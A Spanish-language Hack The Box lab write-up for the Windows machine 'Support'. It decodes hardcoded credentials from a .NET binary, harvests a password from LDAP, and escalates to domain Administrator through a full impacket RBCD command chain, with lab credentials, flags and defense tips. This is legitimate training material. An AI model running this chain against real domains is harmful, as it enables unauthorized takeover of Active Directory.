# HTB - Support 10.129.37.89

### Machine Info

* **Difficulty:** Easy
* **OS:** Windows (Server 2022)
* **IP:** 10.129.37.89
* **Key Skills:** .NET reversing, LDAP enumeration, BloodHound, Resource-Based Constrained Delegation (RBCD)

### Overview

Support es un Domain Controller de Windows que expone un binario .NET con credenciales LDAP hardcodeadas y ofuscadas. Después de reversear el binario para obtener la contraseña, enumeramos LDAP y encontramos credenciales adicionales en el campo `info` de un usuario. Con acceso al usuario `support`, descubrimos que tiene GenericAll sobre el DC, lo que nos permite abusar de RBCD para impersonar Administrator.

**Key Concepts:**

* Reversing de .NET y deofuscación XOR
* LDAP enumeration con ldapdomaindump
* BloodHound para identificar attack paths
* Resource-Based Constrained Delegation (RBCD)

### Exploitation Workflow Summary

```
Initial Enumeration
├─ Nmap revela SMB, LDAP, WinRM, Kerberos (DC)
├─ SMB share contiene binario UserInfo.exe
└─ Reversing del .NET revela credenciales LDAP ofuscadas

Foothold
├─ Deofuscar contraseña con XOR
├─ LDAP enumeration con credenciales de ldap user
├─ Encontrar password en campo 'info' del usuario support
└─ WinRM como support user

Privilege Escalation
├─ BloodHound revela GenericAll sobre DC$
├─ Crear machine account falsa
├─ Configurar RBCD delegation
├─ S4U2Proxy para obtener TGS como Administrator
└─ PSExec como Administrator
```

***

### Initial Enumeration

#### Port Scanning

```bash
nmap -p- -Pn -sCV 10.129.37.89 -oN nmap.tcp
```

**Puertos relevantes:**

* 53/tcp - DNS
* 88/tcp - Kerberos
* 135/tcp - MSRPC
* 139/445/tcp - SMB
* 389/636/tcp - LDAP/LDAPS
* 5985/tcp - WinRM

**What we learned:** Es un Domain Controller (Kerberos + LDAP + DNS). El dominio es `support.htb`.

#### SMB Enumeration

Encontramos un share accesible con un binario .NET:

```bash
smbclient -L //10.129.37.89 -N
smbclient //10.129.37.89/support-tools -N
```

Descargamos `UserInfo.exe.zip` que contiene un binario .NET.

***

### Foothold - .NET Reversing

#### Analyzing the Binary

Usando dnSpy o ILSpy, encontramos la clase `Protected` con credenciales ofuscadas:

```csharp
internal class Protected
{
    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(Protected.enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
        }
        return Encoding.Default.GetString(array2);
    }

    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
}
```

**What's happening:** La contraseña está en Base64, luego XOR con la key "armando", luego XOR con 223.

#### Decrypting the Password

```powershell
$enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
$key = [System.Text.Encoding]::ASCII.GetBytes("armando")
$data = [Convert]::FromBase64String($enc)

for ($i=0; $i -lt $data.Length; $i++) {
    $data[$i] = $data[$i] -bxor $key[$i % $key.Length] -bxor 223
}

[System.Text.Encoding]::Default.GetString($data)
```

**Output:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Revisando el código, vemos que el usuario es `ldap`:

```csharp
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

**Credenciales obtenidas:** `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

***

### LDAP Enumeration

#### Dumping LDAP

```bash
ldapdomaindump ldap://support.htb -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --no-json --no-grep
```

**Pro tip:** Los HTML no traen toda la info. Usar `--no-json` es un error - los JSON tienen más datos.

#### Finding Hidden Credentials

En el JSON de usuarios, el usuario `support` tiene algo interesante en el campo `info`:

```json
{
    "cn": "support",
    "info": "Ironside47pleasure40Watchful",
    "memberOf": [
        "CN=Shared Support Accounts,CN=Users,DC=support,DC=htb",
        "CN=Remote Management Users,CN=Builtin,DC=support,DC=htb"
    ]
}
```

**Credenciales encontradas:** `support:Ironside47pleasure40Watchful`

#### User Access

````bash
evil-winrm -i 10.129.37.89 -u support -p 'Ironside47pleasure40Watchful'
```
```
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
f3a52baf1089bb907625565d2f29983f
````

***

### Privilege Escalation - RBCD

#### BloodHound Enumeration

```bash
bloodhound-python -c All -d 'support.htb' -u 'support' -p 'Ironside47pleasure40Watchful' -ns 10.129.37.89
```

**Finding:** El usuario `support` (via grupo "Shared Support Accounts") tiene **GenericAll** sobre `DC.SUPPORT.HTB`.

#### Understanding RBCD

**What's RBCD?** Resource-Based Constrained Delegation permite que una machine account delegue a otra. Con GenericAll sobre el DC, podemos modificar el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` para permitir que una machine account que controlamos impersone usuarios contra el DC.

#### Exploitation Steps

**1. Limpiar tickets previos:**

```bash
rm -f *.ccache
unset KRB5CCNAME
```

**2. Crear machine account falsa:**

```bash
addcomputer.py -computer-name 'fakeMachine$' -computer-pass 'fakfak' -dc-ip 10.129.37.89 'support.htb/support:Ironside47pleasure40Watchful'
```

**3. Configurar RBCD:**

```bash
impacket-rbcd -delegate-to 'DC$' -delegate-from 'fakeMachine$' -dc-ip 10.129.37.89 -action write 'support.htb/support:Ironside47pleasure40Watchful'
```

**4. Verificar delegación:**

```bash
impacket-rbcd -delegate-to 'DC$' -delegate-from 'fakeMachine$' -dc-ip 10.129.37.89 -action read 'support.htb/support:Ironside47pleasure40Watchful'
```

**5. Obtener TGS como Administrator:**

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.37.89 'support.htb/fakeMachine$:fakfak'
```

**6. Usar el ticket:**

````bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc.support.htb
```
```
C:\Users\Administrator\Desktop> type root.txt
da20e5ed004f220c03404afa0502e6de
````

***

### Quick Reference

#### Initial Access

```bash
# LDAP creds from .NET binary
ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

# Support user creds from LDAP info field
support:Ironside47pleasure40Watchful
```

#### RBCD Attack

```bash
# Create machine account
addcomputer.py -computer-name 'fakeMachine$' -computer-pass 'fakfak' -dc-ip 10.129.37.89 'support.htb/support:Ironside47pleasure40Watchful'

# Configure RBCD
impacket-rbcd -delegate-to 'DC$' -delegate-from 'fakeMachine$' -dc-ip 10.129.37.89 -action write 'support.htb/support:Ironside47pleasure40Watchful'

# Get TGS
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.37.89 'support.htb/fakeMachine$:fakfak'

# PSExec
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc.support.htb
```

***

### Key Takeaways

**What we learned:**

* Binarios .NET pueden contener credenciales hardcodeadas - siempre reversear
* El campo `info` en LDAP puede contener passwords (mala práctica común)
* ldapdomaindump con JSON tiene más información que los HTML
* GenericAll sobre un computer object = RBCD para domain admin
* WinRM inestable? Usar herramientas remotas en lugar de shell interactivo

**Defense recommendations:**

* No hardcodear credenciales en binarios
* No almacenar passwords en campos LDAP como `info` o `description`
* Auditar permisos de grupos sobre computer objects
* Limitar quién puede crear machine accounts (ms-DS-MachineAccountQuota)

***

### Related Topics

* \[\[RBCD - Resource-Based Constrained Delegation]]
* \[\[.NET Reversing]]
* \[\[LDAP Enumeration]]
* \[\[BloodHound]]
* \[\[Kerberos Delegation Attacks]]
